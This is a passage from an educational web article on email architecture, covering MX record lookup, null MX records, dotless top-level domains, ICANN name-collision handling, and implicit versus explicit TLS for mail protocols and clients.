While restricted authorization is common for other services, it’s not yet the norm for email.
Once the client is authenticated, it can retrieve, deposit, and delete messages.
It can also mark them as read or flag them for later attention.</p>

<details open="">
  <summary id="address-resolution">
Address resolution
</summary>

  <p>How do outgoing mail servers find the incoming mail server of a recipient?
As we learned above, an <a href="#address">email address</a> consists of a username and a domain name, separated by the @ symbol.
A sender finds the incoming mail server of a recipient
by querying the <a href="https://evalapply.org/internet/#domain-name-system">Domain Name System (<abbr title="Domain Name System">DNS</abbr>)</a>
for mail exchange (<code>MX</code>) records of the used domain name.
If no such records exist, the sender <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-5.1">queries for address records</a>
(<code>A</code> or <code>AAAA</code>) of the domain name instead.
If the <abbr title="Domain Name System">DNS</abbr> response is not authenticated with <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>,
mail might be sent to the server of an attacker.
<a href="https://evalapply.org/internet/#transport-layer-security"><abbr title="Transport Layer Security">TLS</abbr></a> can prevent this only
if the sender requires that the recipient’s domain is included in the
<a href="https://en.wikipedia.org/wiki/Public_key_certificate#TLS/SSL_server_certificate">server certificate</a>,
which is <a href="#server-authentication">usually not the case</a>.
A standard for <a href="#mail-transfer-agent-strict-transport-security">securing <code>MX</code> records with <abbr title="Transport Layer Security">TLS</abbr></a> exists, though.</p>

  <p>A domain can list several servers that handle incoming mail.
<code>MX</code> records assign a priority to each incoming mail server.
The lower the number, the higher its priority.
This is useful for providing redundancy in case the most preferred server is not responding.
Several servers with the same priority can be used for
<a href="https://en.wikipedia.org/wiki/Load_balancing_(computing)">load balancing</a>.
You can use the following tool to look up the incoming mail servers of a domain you are interested in.
It uses an <a href="https://developers.google.com/speed/public-dns/docs/doh/json"><abbr title="Application Programming Interface">API</abbr> by Google</a> to query the Domain Name System
and an <a href="https://ipinfo.io/developers"><abbr title="Application Programming Interface">API</abbr> by ipinfo.io</a> to determine the geographic location of each server.
The latter is just to remind you that the Internet is a physical infrastructure.
Outgoing mail servers need to know only the <abbr title="Internet Protocol">IP</abbr> address of the incoming mail server, of course.
(A remark on the subdomains you might encounter:
<a href="https://en.wikipedia.org/wiki/Spooling">spool</a> is a synonym for
<a href="https://en.wikipedia.org/wiki/Data_buffer">buffer</a>/<a href="https://en.wikipedia.org/wiki/Queue_(abstract_data_type)">queue</a>,
<code>fb</code> probably stands for fallback and <code>alt</code> for alternative.)</p>

  

</details>

<details>
  <summary id="null-mx-record">
Null <abbr title="Mail eXchange">MX</abbr> record
</summary>

  <p>As we’ve seen in the <a href="#address-resolution">previous box</a>,
outgoing mail servers fall back to <code>A</code>/<code>AAAA</code> records
if no <code>MX</code> records are found at the recipient’s domain.
If no incoming mail server listens at one of the <code>A</code>/<code>AAAA</code> addresses,
an outgoing mail server will attempt to deliver emails to such a domain for days.
This is not just a waste of resources,
it also delays the <a href="#bounce-messages">bounce message</a> to the sender of the message,
who might have simply mistyped the address of the recipient.
In order to prevent this from happening,
<a href="https://datatracker.ietf.org/doc/html/rfc7505"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7505</a> defines a “null <code>MX</code> record” as <code>0 .</code>
similar to how <a href="#autoconfiguration"><code>SRV</code> records</a> indicate the unavailability of a service.
You should configure a null <code>MX</code> record on all your <a href="#organizational-domain">organizational domains</a>
which neither send nor receive emails.</p>

</details>

<details>
  <summary id="dotless-domains">
Dotless domains
</summary>

  <p>From a technical perspective, <a href="https://en.wikipedia.org/wiki/Top-level_domain">top-level domains</a>
are domains like any other in the <a href="https://evalapply.org/internet/#domain-name-system">Domain Name System (<abbr title="Domain Name System">DNS</abbr>)</a>.
This means that they can also have <code>A</code>, <code>AAAA</code>, and <code>MX</code> records and receive mail.
Since top-level domains with such records can be used in email and Web addresses without a dot,
they are called dotless domains.
For example, you can visit <a href="http://ai/">http://ai/</a> with your browser.
<a href="https://en.wikipedia.org/wiki/.ai"><code>.ai</code></a> is the
<a href="https://en.wikipedia.org/wiki/Country_code_top-level_domain">country-code top-level domain</a>
of <a href="https://en.wikipedia.org/wiki/Anguilla">Anguilla</a>.
The problem with dotless domains is that single labels are often used to address other machines in the local network.
Having such names resolve in the global <abbr title="Domain Name System">DNS</abbr> poses a
<a href="https://www.icann.org/en/groups/ssac/documents/sac-053-en.pdf">security risk</a>.
Additionally, browsers usually pass your input to a <a href="https://en.wikipedia.org/wiki/Search_engine">search engine</a>
if you enter a single word into the <a href="https://en.wikipedia.org/wiki/Address_bar">address bar</a>.
Since dotless domains violate the expectations of users and
the <a href="https://en.wikipedia.org/wiki/Design_by_contract">assumptions of programmers</a>,
<a href="https://en.wikipedia.org/wiki/ICANN">ICANN</a> forbids <code>A</code>, <code>AAAA</code>, and <code>MX</code> records
on new <a href="https://en.wikipedia.org/wiki/Generic_top-level_domain">generic top-level domains</a>
<a href="https://www.icann.org/en/announcements/details/new-gtld-dotless-domain-names-prohibited-30-8-2013-en">since 2013</a>.
Out of the <a href="https://www.iana.org/domains/root/db">1’502 top-level domains</a>,
the following 23 of them have have an <code>A</code>, <code>AAAA</code>, or <code>MX</code> record in April 2021:
<a href="https://www.iana.org/domains/root/db/ai.html"><code>.ai</code></a>,
<a href="https://www.iana.org/domains/root/db/bh.html"><code>.bh</code></a>,
<a href="https://www.iana.org/domains/root/db/cf.html"><code>.cf</code></a>,
<a href="https://www.iana.org/domains/root/db/cm.html"><code>.cm</code></a>,
<a href="https://www.iana.org/domains/root/db/gp.html"><code>.gp</code></a>,
<a href="https://www.iana.org/domains/root/db/gt.html"><code>.gt</code></a>,
<a href="https://www.iana.org/domains/root/db/hr.html"><code>.hr</code></a>,
<a href="https://www.iana.org/domains/root/db/kh.html"><code>.kh</code></a>,
<a href="https://www.iana.org/domains/root/db/lk.html"><code>.lk</code></a>,
<a href="https://www.iana.org/domains/root/db/mq.html"><code>.mq</code></a>,
<a href="https://www.iana.org/domains/root/db/mr.html"><code>.mr</code></a>,
<a href="https://www.iana.org/domains/root/db/pa.html"><code>.pa</code></a>,
<a href="https://www.iana.org/domains/root/db/ph.html"><code>.ph</code></a>,
<a href="https://www.iana.org/domains/root/db/pn.html"><code>.pn</code></a>,
<a href="https://www.iana.org/domains/root/db/sr.html"><code>.sr</code></a>,
<a href="https://www.iana.org/domains/root/db/tk.html"><code>.tk</code></a>,
<a href="https://www.iana.org/domains/root/db/tt.html"><code>.tt</code></a>,
<a href="https://www.iana.org/domains/root/db/ua.html"><code>.ua</code></a>,
<a href="https://www.iana.org/domains/root/db/uz.html"><code>.uz</code></a>,
<a href="https://www.iana.org/domains/root/db/va.html"><code>.va</code></a>,
<a href="https://www.iana.org/domains/root/db/ws.html"><code>.ws</code></a>,
<a href="https://www.iana.org/domains/root/db/xn--l1acc.html"><code>.xn--l1acc</code></a>, and
<a href="https://www.iana.org/domains/root/db/xn--mgbah1a3hjkrd.html"><code>.xn--mgbah1a3hjkrd</code></a>.
(The last two domains are <a href="#internationalized-domain-names">internationalized domain names</a>.)
I’ve determined this list with the script from <a href="https://datatracker.ietf.org/doc/html/rfc7085#appendix-A"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7085</a>,
which uses <a href="https://en.wikipedia.org/wiki/Internet_Assigned_Numbers_Authority"><abbr title="Internet Assigned Numbers Authority">IANA</abbr>’s</a>
machine-readable <a href="https://data.iana.org/TLD/tlds-alpha-by-domain.txt">list of top-level domains</a>.
On yet another note, the <a href="https://en.wikipedia.org/wiki/Formal_grammar">formal grammar</a>
in <a href="https://datatracker.ietf.org/doc/html/rfc2821#section-4.1.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2821</a>
required that the domain part of an email address consists of at least two labels.
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a> no longer has this requirement.</p>

</details>

<details>
  <summary id="name-collisions">
Name collisions
</summary>

  <p>If you run the script from <a href="https://datatracker.ietf.org/doc/html/rfc7085#appendix-A"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7085</a> yourself,
you will notice that many name servers cannot be resolved
and that a few top-level domains have an <code>A</code> record of <code>127.0.53.53</code>
and an <code>MX</code> record of <code>10 your-dns-needs-immediate-attention.{TLD}.</code>,
where <code>{TLD}</code> is the corresponding top-level domain.
The following eight top-level domains have such records in April 2021:
<a href="https://www.iana.org/domains/root/db/arab.html"><code>.arab</code></a>,
<a href="https://www.iana.org/domains/root/db/cpa.html"><code>.cpa</code></a>,
<a href="https://www.iana.org/domains/root/db/llp.html"><code>.llp</code></a>,
<a href="https://www.iana.org/domains/root/db/politie.html"><code>.politie</code></a>,
<a href="https://www.iana.org/domains/root/db/spa.html"><code>.spa</code></a>,
<a href="https://www.iana.org/domains/root/db/watches.html"><code>.watches</code></a>,
<a href="https://www.iana.org/domains/root/db/xn--mxtq1m.html"><code>.xn--mxtq1m</code></a>,
and <a href="https://www.iana.org/domains/root/db/xn--ngbrx.html"><code>.xn--ngbrx</code></a>.
<a href="https://www.icann.org/en/announcements/details/icann-approves-name-collision-occurrence-management-framework--special-ip-address-12705353-alerts-system-administrators-of-potential-issue-1-8-2014-en">Since 2014</a>,
<a href="https://en.wikipedia.org/wiki/ICANN">ICANN</a> requires that
new <a href="https://en.wikipedia.org/wiki/Generic_top-level_domain">generic top-level domains</a> undergo a
<a href="https://www.icann.org/resources/pages/name-collision-it-pros-faqs-2014-08-01-en#interruption">controlled interruption</a>
for 90 days before becoming operational.
Besides the above <code>A</code> and <code>MX</code> records, a controlled interruption also involves
a <code>TXT</code> record of <code>Your DNS configuration needs immediate attention see https://icann.org/namecollision</code>
and an <code>SRV</code> record of <code>10 10 0 your-dns-needs-immediate-attention.{TLD}.</code>.
New <a href="https://en.wikipedia.org/wiki/Country_code_top-level_domain">country-code top-level domains</a>
can but don’t have to undergo a controlled interruption.
The goal of controlled interruptions is to give <abbr title="Information Technology">IT</abbr> administrators an opportunity
to detect when names which are used only locally suddenly resolve differently than before.
This can happen when companies use private top-level domains in their <a href="https://en.wikipedia.org/wiki/Intranet">Intranet</a>
or when a local <abbr title="Domain Name System">DNS</abbr> resolver extends relative domain names to
<a href="https://en.wikipedia.org/wiki/Fully_qualified_domain_name">fully qualified domain names (<abbr title="Fully Qualified Domain Name">FQDN</abbr>)</a>
by using <a href="https://en.wikipedia.org/wiki/Search_domain">search lists</a>.
On <a href="https://en.wikipedia.org/wiki/Unix-like">Unix-like</a> operating systems,
a search domain can be configured in the file <a href="https://en.wikipedia.org/wiki/Resolv.conf"><code>/etc/resolv.conf</code></a>
with a line such as <code>search example.com</code>.
When the user enters <code>wiki</code>, the local <abbr title="Domain Name System">DNS</abbr> resolver might append the search domain to the input
and resolve it as <code>wiki.example.com</code> only once a query for <code>wiki</code> in the global <abbr title="Domain Name System">DNS</abbr> has returned no results.
When the top-level domain <a href="https://www.iana.org/domains/root/db/wiki.html"><code>.wiki</code></a> is introduced,
the user can no longer access the company’s <a href="https://en.wikipedia.org/wiki/Wiki">Wiki</a>.
Before employees load a resource from an unintended third party or leak information to the Internet,
the controlled interruption ensures that the lookup fails
and that the <a href="https://icann.org/namecollision">name collision</a> can be detected before it causes harm.</p>

</details>

<h2 id="protocols">Protocols</h2>

<p>The above entities communicate with two kinds of protocols:
They use <a href="#delivery-protocols">delivery protocols</a> to deliver messages
and <a href="#access-protocols">access protocols</a> to access the user’s mailbox.
As discussed <a href="#standardization">earlier</a>,
only <a href="#simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a> for <a href="#submission-versus-relay">message relay</a> is mandatory.
All other protocols can be replaced in a proprietary setup.
For example, there are <a href="#json-meta-application-protocol">efforts</a>
to combine <a href="#submission-versus-relay">message submission</a>
and <a href="#internet-message-access-protocol">mailbox access</a>
in a standardized way.</p>

<figure>
  <svg id="figure-simplified-architecture-protocols" data-name="simplified-architecture-protocols" width="599.148" height="298.25" viewBox="-131.662 -5 599.148 298.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <path d="M -0.312,250.25 A 77.394 165.5 0 0 1 -77.706,84.75 L -77.706447,84.740008" marker-end="url(#arrow-blue)" stroke-dasharray="190"></path>
    <text text-anchor="end">
        <tspan x="-60.121" y="224.146"><tspan>imap</tspan> for</tspan><tspan x="-60.121" y="246.146">message</tspan><tspan x="-60.121" y="268.146">storage</tspan>
    </text>
    <line x1="283.118" y1="208.188" x2="283.118" y2="84.75" marker-end="url(#arrow-blue)" stroke-dasharray="116"></line>
    <text text-anchor="start">
        <tspan x="295.118" y="129.9"><tspan>imap</tspan> or <tspan>pop3</tspan></tspan><tspan x="295.118" y="151.9">for message</tspan><tspan x="295.118" y="173.9">retrieval</tspan>
    </text>
    <line x1="105.725" y1="41.75" x2="229.162" y2="41.75" marker-end="url(#arrow-green)" stroke-dasharray="116"></line>
    <text text-anchor="middle">
        <tspan x="167.912" y="7.75"><tspan>smtp</tspan> for</tspan><tspan x="167.912" y="29.75">message relay</tspan>
    </text>
    <line x1="52.706" y1="208.188" x2="52.706" y2="84.75" marker-end="url(#arrow-green)" stroke-dasharray="116"></line>
    <text text-anchor="end">
        <tspan x="40.706" y="129.9"><tspan>smtp</tspan> for</tspan><tspan x="40.706" y="151.9">message</tspan><tspan x="40.706" y="173.9">submission</tspan>
    </text>
    <rect x="0" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="52.706" y="267.15">of sender</tspan>
    </text>
    <rect x="0" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="52.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="52.706" y="69.65">of sender</tspan>
    </text>
    <rect x="230.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="283.118" y="47.65"><tspan>mail server</tspan></tspan><tspan x="283.118" y="69.65">of recipient</tspan>
    </text>
    <rect x="230.412" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="283.118" y="267.15">of recipient</tspan>
    </text>
    <rect x="-130.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="-77.706" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="-77.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="-77.706" y="69.65">of sender</tspan>
    </text>
    <rect x="360.824" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="413.53" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="413.53" y="47.65"><tspan>mail server</tspan></tspan><tspan x="413.53" y="69.65">of recipient</tspan>
    </text>

</svg>

  <figcaption>

The simplified email architecture
with <a href="#delivery-protocols">delivery protocols</a> in green
and <a href="#access-protocols">access protocols</a> in blue.

</figcaption>
</figure>

<h3 id="use-of-tls">Use of <abbr title="Transport Layer Security">TLS</abbr></h3>

<p>Historically, <a href="#simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a>, <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a>, and
<a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a> ran directly on top of the <a href="https://evalapply.org/internet/#transport-layer">transport layer</a>
using the <a href="https://evalapply.org/internet/#transmission-control-protocol">Transmission Control Protocol (<abbr title="Transmission Control Protocol">TCP</abbr>)</a>,
which means that the communication was neither encrypted nor authenticated.
Anyone with access to one of the networks through which the communication was routed
could therefore read and potentially alter your messages.
Even your user password might have been transmitted in the clear.
In theory, the solution is straightforward:
Use <a href="https://evalapply.org/internet/#transport-layer-security">Transport Layer Security (<abbr title="Transport Layer Security">TLS</abbr>)</a>
to encrypt and authenticate the communication between each pair of entities.
In practice, however, you want to be <a href="https://en.wikipedia.org/wiki/Backward_compatibility">backward compatible</a>:
A server that expects requests to be in a specific format cannot suddenly handle a request for a <abbr title="Transport Layer Security">TLS</abbr> handshake.
There are two ways around this problem:</p>
<ul>
  <li><strong>Implicit <abbr title="Transport Layer Security">TLS</abbr></strong>:
Introduce a new port number for each service on which the communication starts directly with a <abbr title="Transport Layer Security">TLS</abbr> handshake.
The protocol variant which uses <abbr title="Transport Layer Security">TLS</abbr> implicitly is denoted by appending an S to its name.
For example, <abbr title="Internet Message Access Protocol">IMAP</abbr> becomes <abbr title="Internet Message Access Protocol Secure">IMAPS</abbr>.</li>
  <li><strong>Explicit <abbr title="Transport Layer Security">TLS</abbr></strong> or <a href="#starttls-extension"><abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr></a>,
sometimes mistakenly called <a href="https://en.wikipedia.org/wiki/Opportunistic_TLS">opportunistic <abbr title="Transport Layer Security">TLS</abbr></a>:
Allow the client to upgrade an insecure connection to a secure connection with a command
once the server has indicated that it supports <abbr title="Transport Layer Security">TLS</abbr>.
The communication is secured only if the client requests this explicitly.
The server cannot require the upgrade to <abbr title="Transport Layer Security">TLS</abbr> as this would break backward compatibility.</li>
</ul>

<p>With <a href="#smtp-for-relay-with-implicit-tls">one notable exception</a>,
most longstanding email protocols were adapted to support both Implicit <abbr title="Transport Layer Security">TLS</abbr> and Explicit <abbr title="Transport Layer Security">TLS</abbr>.</p>

<details>
  <summary id="implicit-tls-versus-explicit-tls">
Implicit <abbr title="Transport Layer Security">TLS</abbr> versus Explicit <abbr title="Transport Layer Security">TLS</abbr>
</summary>

  <p>When comparing the two approaches,
Implicit <abbr title="Transport Layer Security">TLS</abbr> is significantly easier to implement, debug, and deploy than Explicit <abbr title="Transport Layer Security">TLS</abbr>.
For example, many implementations of Explicit <abbr title="Transport Layer Security">TLS</abbr> allowed an attacker to
<a href="https://www.kb.cert.org/vuls/id/555316">inject commands during the unencrypted phase</a>,
which would then be executed during the encrypted phase of the protocol.
Implicit <abbr title="Transport Layer Security">TLS</abbr> was once discouraged in favor of Explicit <abbr title="Transport Layer Security">TLS</abbr> for the
<a href="https://datatracker.ietf.org/doc/html/rfc2595#section-7">following reasons</a>:</p>
  <ul>
    <li><strong>Implicit <abbr title="Transport Layer Security">TLS</abbr> leads to new protocols</strong>:
The discovery of whether <abbr title="Transport Layer Security">TLS</abbr> is supported should be made by the client
and not by the user, who is likely confused by additional protocol options.
However, the same can also be accomplished with Implicit <abbr title="Transport Layer Security">TLS</abbr>.</li>
    <li><strong><abbr title="Transport Layer Security">TLS</abbr> can be used insecurely</strong>:
Unless prohibited by the client or the server,
<abbr title="Transport Layer Security">TLS</abbr> can be used in deprecated versions or with weak security parameters.
The protocol variant with Implicit <abbr title="Transport Layer Security">TLS</abbr> can possibly mislead users into a false sense of security.</li>
    <li><strong>Worse opportunistic mode</strong>:
If the client prefers to proceed without encryption and authentication
rather than aborting the connection when the server doesn’t support <abbr title="Transport Layer Security">TLS</abbr>,
Implicit <abbr title="Transport Layer Security">TLS</abbr> forces the client to wait for a timeout on the new port
before establishing another connection on the traditional port.
Once a secure connection could be established, though,
the client should no longer accept insecure connections.
Since the insecure protocol could still advertise when its secure variant is available,
having only Implicit <abbr title="Transport Layer Security">TLS</abbr> wouldn’t cause a lot of overhead in practice.</li>
    <li><strong>Port number exhaustion</strong>:
If every protocol requires two ports (one to be used with <abbr title="Transport Layer Security">TLS</abbr> and one without <abbr title="Transport Layer Security">TLS</abbr>),
only half as many protocols can be accommodated in the limited space of port numbers.
Luckily, this won’t be a problem anytime soon.</li>
  </ul>

  <p>Since the ease of deployment should trump any other concerns when it comes to security,
<a href="https://datatracker.ietf.org/doc/html/rfc8314"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8314</a> recommends Implicit <abbr title="Transport Layer Security">TLS</abbr> over Explicit <abbr title="Transport Layer Security">TLS</abbr>
for <abbr title="Internet Message Access Protocol">IMAP</abbr>, <abbr title="Post Office Protocol version 3">POP3</abbr>, and <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> for message submission since 2018.
When used opportunistically,
Implicit <abbr title="Transport Layer Security">TLS</abbr> and Explicit <abbr title="Transport Layer Security">TLS</abbr> provide security only against
<a href="https://en.wikipedia.org/wiki/Passive_attack">passive attacks</a>,
where an attacker can merely eavesdrop on your communication but cannot interfere with it.
In the presence of an <a href="https://en.wikipedia.org/wiki/Adversary_(cryptography)">active adversary</a>,
who can modify and drop network packets,
neither Explicit <abbr title="Transport Layer Security">TLS</abbr> nor Implicit <abbr title="Transport Layer Security">TLS</abbr> are secure
unless the client has a trusted way to know that the server supports <abbr title="Transport Layer Security">TLS</abbr>.
In the case of Implicit <abbr title="Transport Layer Security">TLS</abbr>, the attacker just has to drop the client’s communication to the new port,
which forces the client to connect to the old port using the insecure protocol in order to remain backward compatible.
In the case of Explicit <abbr title="Transport Layer Security">TLS</abbr>,
the server lists <abbr title="Transport Layer Security">TLS</abbr> among its capabilities while the communication is not yet authenticated.
The attacker can simply <a href="#transport-security">strip <abbr title="Transport Layer Security">TLS</abbr></a> from the server’s capabilities,
which leaves the client with no other option than to continue in plaintext.
Alternatively, a client can sacrifice compatibility and refuse to exchange messages over an insecure channel.
However, such a change is difficult to introduce because users hate it when their setup no longer works.
It is therefore better if the client has a trusted way to know whether the server supports <abbr title="Transport Layer Security">TLS</abbr>.
The following three methods are used in practice to inform the client:</p>
  <ul>
    <li><strong>Previous connections</strong>:
Once a mail server has been upgraded to support <abbr title="Transport Layer Security">TLS</abbr>,
it almost certainly won’t be downgraded again.
Based on this heuristic,
the client can refuse plaintext connections to any server to which it had a <abbr title="Transport Layer Security">TLS</abbr> connection in the past.</li>
    <li><strong>Authenticated channel</strong>:
While the server cannot reliably inform clients about its capabilities over a downgradeable protocol,
it can use another, already authenticated protocol,
such as <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>,
to convey this information to them.</li>
    <li><strong>User configuration</strong>:
Last but not least, the user can configure the client according to some documentation,
which has to be trustworthy, of course.
The server’s capability might be printed on a leaflet or mentioned on a website secured with <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr>.</li>
  </ul>

  <p>Since securing email deserves much more attention,
I’ve dedicated a whole section to <a href="#transport-security">transport security</a> later in this article.</p>

</details>

<details>
  <summary id="tls-settings-in-mail-clients">
<abbr title="Transport Layer Security">TLS</abbr> settings in mail clients
</summary>

  <p>If you have to <a href="#configuration">configure your mail client</a> manually,
it will likely choose the right security option automatically
based on the <a href="#port-numbers">port number</a> that you’ve entered.
Different clients call the two options differently.
Just make sure that one of the two is enabled.</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Mail client</th>
          <th>Name for Implicit <abbr title="Transport Layer Security">TLS</abbr></th>
          <th>Name for Explicit <abbr title="Transport Layer Security">TLS</abbr></th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><a href="https://support.apple.com/guide/mail/change-outgoing-server-settings-cpmlprefsmtpserver/mac">Apple Mail</a></td>
          <td><abbr title="Transport Layer Security">TLS</abbr>/SSL</td>
          <td><abbr title="Transport Layer Security">TLS</abbr>/SSL</td>
        </tr>
        <tr>
          <td><a href="https://support.microsoft.com/en-us/office/pop-imap-and-smtp-settings-for-outlook-com-d088b986-291d-42b8-9564-9c414e2aa040">Microsoft Outlook</a></td>
          <td><abbr title="Transport Layer Security">TLS</abbr></td>
          <td><abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr></td>
        </tr>
        <tr>
          <td><a href="https://support.mozilla.org/en-US/kb/manual-account-configuration">Mozilla Thunderbird</a></td>
          <td>SSL/<abbr title="Transport Layer Security">TLS</abbr></td>
          <td><abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr></td>
        </tr>
      </tbody>
    </table>

    <figcaption>

Mail clients often use other names for Implicit <abbr title="Transport Layer Security">TLS</abbr> and Explicit <abbr title="Transport Layer Security">TLS</abbr>.

</figcaption>
  </figure>

  <p>As far as I can tell,
Apple Mail doesn’t distinguish between Implicit <abbr title="Transport Layer Security">TLS</abbr> and Explicit <abbr title="Transport Layer Security">TLS</abbr>.
As long as the default ports are used,
this seems like a reasonable simplification.
However, how does Apple Mail determine whether to use Implicit <abbr title="Transport Layer Security">TLS</abbr> or Explicit <abbr title="Transport Layer Security">TLS</abbr>
when one of the services is deployed on a custom port?
Will it try both and see which one worked?</p>

  <p>Anyhow, we can just hope that mail clients refuse insecure connections when the appropriate <abbr title="Transport Layer Security">TLS</abbr> option is enabled.
I assume this is the case, but having the actual behavior documented would still be nice.
For example, Apple Mail has an option to allow insecure authentication under “Advanced <abbr title="Internet Message Access Protocol">IMAP</abbr> Settings”,
which doesn’t disable the “Use <abbr title="Transport Layer Security">TLS</abbr>/SSL” checkbox as seen below.
The <a href="https://support.apple.com/guide/mail/change-outgoing-server-settings-cpmlprefsmtpserver/mac#mlhl85747a42">documentation</a> says:
“For accounts that don’t support secure authentication,
let Mail use a non-encrypted version of your user name and password to connect to the mail server.”
What does this mean?
Are they talking about <a href="#challenge-response-authentication-mechanism"><abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr> (challenge-response authentication mechanism)</a>,
which uses a hash function and not encryption,
or does this option make <abbr title="Transport Layer Security">TLS</abbr> <a href="#implicit-tls-versus-explicit-tls">opportunistic</a>? 🤷‍♂️</p>

  <figure>
    <p><img src="https://evalapply.org/pages/email/generated/email-settings-manual.light.png"/>
<img src="https://evalapply.org/pages/email/generated/email-settings-manual.dark.png"/>
    

</p>

    <figcaption>The server settings in Apple Mail when “Automatically manage connection settings” is disabled. Also somewhat disappointingly, Apple Mail uses Explicit <abbr title="Transport Layer Security">TLS</abbr> rather than Implicit <abbr title="Transport Layer Security">TLS</abbr> by default.</figcaption>

  </figure>

</details>

<details>
  <summary id="encryption-on-the-web">
Encryption on the Web
</summary>

  <p>Historically, your web browser used the <a href="https://evalapply.org/internet/#hypertext-transfer-protocol">HyperText Transfer Protocol (<abbr title="HyperText Transfer Protocol">HTTP</abbr>)</a>
to fetch websites and other resources from web servers.
Just like the original email protocols, <abbr title="HyperText Transfer Protocol">HTTP</abbr> runs directly on top of <abbr title="Transmission Control Protocol">TCP</abbr>,
which means that its communication is neither encrypted nor authenticated.
Since anyone on your network can read the transmitted messages
and <a href="https://en.wikipedia.org/wiki/Session_hijacking">hijack your session</a>,
<abbr title="HyperText Transfer Protocol">HTTP</abbr> should no longer be used.
Also similar to the email protocols, there is a variant of <abbr title="HyperText Transfer Protocol">HTTP</abbr> called <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr>,
which uses Implicit <abbr title="Transport Layer Security">TLS</abbr> to protect your communication.
In order to remain backward compatible, <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> has to use a different port.
While the default port for <abbr title="HyperText Transfer Protocol">HTTP</abbr> is 80, the default port for <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> is 443.
What is less well known because it’s rarely used, is that <abbr title="HyperText Transfer Protocol">HTTP</abbr> supports Explicit <abbr title="Transport Layer Security">TLS</abbr> as well.
Since version 1.1, <abbr title="HyperText Transfer Protocol">HTTP</abbr> has an <a href="https://en.wikipedia.org/wiki/HTTP/1.1_Upgrade_header"><code>Upgrade</code> header field</a>
to upgrade an insecure connection to a secure one.
Because Explicit <abbr title="Transport Layer Security">TLS</abbr> maintains backward compatibility,
it can be offered on port 80 as documented in <a href="https://datatracker.ietf.org/doc/html/rfc2817"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2817</a>.</p>

</details>

<details>
  <summary id="tls-deployment-statistics">
Deployment statistics
</summary>

  <p>What percentage of email is encrypted in transit?
Interestingly, <a href="https://transparencyreport.google.com/safer-email/overview?encrypt_out=start:1386720000000&amp;encrypt_in=start:1386720000000">Google publishes statistics about this</a>
with the data going back as far as December 2013.
While not necessarily representative of overall email traffic,
the data shows that <abbr title="Transport Layer Security">TLS</abbr> usage for emails sent from Gmail increased from around 40% in 2013 to around 90% in 2020,
while <abbr title="Transport Layer Security">TLS</abbr> usage for email sent to Gmail increased from around 30% in 2013 to almost 95% in 2020.
This rapid increase in <a href="#transport-security">transport security</a>
is likely due to the <a href="https://en.wikipedia.org/wiki/Snowden_effect">Snowden effect</a>,
which sparked initiatives such as <a href="https://www.eff.org/https-everywhere"><abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> Everywhere</a>
and <a href="https://starttls-everywhere.org/"><abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr> Everywhere</a>.
Solely relying on <abbr title="Transport Layer Security">TLS</abbr> for security, including the protection of passwords,
has its <a href="#dangerous-reliance-on-tls">own problems</a>, though.
(You might also be interested in a similar report by Google about
<a href="https://transparencyreport.google.com/https/overview"><abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> usage on the web</a>.)</p>

</details>

<h3 id="port-numbers">Port numbers</h3>

<p>Each protocol specifies a <a href="https://evalapply.org/internet/#port-numbers">default port</a> on which servers listen for incoming requests.
Instead of scattering the port numbers used by various email protocols throughout the following subsections,
here is a table with all the relevant information for future reference:</p>

<figure>

  <table>
    <thead>
      <tr>
        <th>Protocol</th>
        <th>Port for Implicit <abbr title="Transport Layer Security">TLS</abbr></th>
        <th>Port for Explicit <abbr title="Transport Layer Security">TLS</abbr></th>
      </tr>
